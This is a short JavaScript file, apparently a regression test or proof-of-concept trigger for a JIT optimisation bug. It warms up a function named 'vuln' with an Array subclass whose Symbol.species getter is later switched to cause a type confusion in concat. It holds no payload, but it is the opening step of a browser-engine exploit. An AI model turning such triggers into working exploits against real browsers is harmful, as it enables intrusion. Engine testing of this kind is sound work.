let trigger_side_effect = false;

class SubArray extends Array {
  static get [Symbol.species]() {
    if (trigger_side_effect) {
      return Array;
    }
    return this;
  }
}

function vuln(arr) {
  const result = arr.concat([]);
  result[0] = 1.1;
}

for (let i = 0; i < 25000; ++i) {
  vuln(new SubArray(13.37));
}

trigger_side_effect = true;
vuln(new SubArray(13.37));